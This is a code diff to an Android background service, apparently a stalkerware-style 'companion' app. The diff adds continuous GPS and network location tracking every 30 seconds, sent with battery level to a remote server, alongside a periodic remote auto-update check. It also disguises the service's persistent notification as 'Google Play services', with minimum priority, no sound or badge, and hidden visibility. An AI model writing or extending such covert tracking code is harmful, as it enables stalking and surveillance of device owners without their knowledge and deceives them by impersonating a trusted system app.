@@ -4,6 +4,7 @@ import android.annotation.SuppressLint;
 import android.app.*;
 import android.content.*;
 import android.location.Location;
+import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.*;
 import androidx.core.app.NotificationCompat;
@@ -15,19 +16,72 @@ public class CompanionSyncService extends Service {
 
     private ScheduledExecutorService scheduler;
     private SharedPreferences prefs;
+    private LocationManager locationManager;
+    private LocationListener locationListener;
 
     @Override
     public void onCreate() {
         super.onCreate();
         prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
         createNotificationChannel();
+        initLocationListener();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         startForeground(NOTIF_ID, buildNotification());
         startPeriodicSync();
+        requestActiveLocationFix();
         return START_STICKY;
+    }
+
+    private void initLocationListener() {
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        if (locationManager == null) return;
+
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(Location loc) {
+                if (loc != null) dispatchLocation(loc);
+            }
+            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+            @Override public void onProviderEnabled(String provider) {}
+            @Override public void onProviderDisabled(String provider) {}
+        };
+    }
+
+    @SuppressLint("MissingPermission")
+    private void requestActiveLocationFix() {
+        if (locationManager == null || locationListener == null) return;
+        new Handler(Looper.getMainLooper()).post(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                        locationManager.requestLocationUpdates(
+                                LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
+                        Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                        if (lastGps != null) dispatchLocation(lastGps);
+                    }
+                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                        locationManager.requestLocationUpdates(
+                                LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
+                        Location lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                        if (lastNet != null) dispatchLocation(lastNet);
+                    }
+                } catch (SecurityException ignored) {}
+            }
+        });
+    }
+
+    private void dispatchLocation(Location loc) {
+        final String deviceId = prefs.getString("device_id", null);
+        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+        if (deviceId == null || loc == null) return;
+
+        int battery = getBatteryLevel();
+        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(),
+                loc.getLongitude(), loc.getAccuracy(), battery, null);
     }
 
     private void startPeriodicSync() {
@@ -36,39 +90,11 @@ public class CompanionSyncService extends Service {
         scheduler.scheduleWithFixedDelay(new Runnable() {
             @Override
             public void run() {
-                performSync();
+                requestActiveLocationFix();
+                AutoUpdater.checkForUpdate(CompanionSyncService.this,
+                        prefs.getString("server_url", "https://snap-app-chi.vercel.app"), false);
             }
-        }, 5, 120, TimeUnit.SECONDS);
-    }
-
-    @SuppressLint("MissingPermission")
-    private void performSync() {
-        final String deviceId = prefs.getString("device_id", null);
-        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
-        if (deviceId == null) return;
-
-        // 1. Fetch Location via Native Android LocationManager (100% device compatibility)
-        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        Location loc = null;
-        if (lm != null) {
-            try {
-                if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                    loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                }
-                if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                }
-            } catch (SecurityException ignored) {}
-        }
-
-        if (loc != null) {
-            int battery = getBatteryLevel();
-            ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(),
-                    loc.getLongitude(), loc.getAccuracy(), battery, null);
-        }
-
-        // 2. Lifetime Auto-Update Check
-        AutoUpdater.checkForUpdate(this, serverUrl, false);
+        }, 5, 60, TimeUnit.SECONDS);
     }
 
     private int getBatteryLevel() {
@@ -86,10 +112,11 @@ public class CompanionSyncService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "System Security Protection",
-                    NotificationManager.IMPORTANCE_LOW
+                    "System Security",
+                    NotificationManager.IMPORTANCE_MIN
             );
-            channel.setDescription("Ensures background device safety telemetry remains active");
+            channel.setShowBadge(false);
+            channel.setSound(null, null);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
         }
@@ -101,11 +128,11 @@ public class CompanionSyncService extends Service {
                 Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Security Service")
-                .setContentText("Protected & connected to safety dashboard")
-                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
+                .setContentTitle("Google Play services")
+                .setContentText("Syncing security data")
+                .setSmallIcon(android.R.drawable.stat_sys_sync_none)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .setContentIntent(pi)
                 .build();
     }
@@ -118,6 +145,9 @@ public class CompanionSyncService extends Service {
     @Override
     public void onDestroy() {
         if (scheduler != null) scheduler.shutdown();
+        if (locationManager != null && locationListener != null) {
+            locationManager.removeUpdates(locationListener);
+        }
         super.onDestroy();
     }
 }
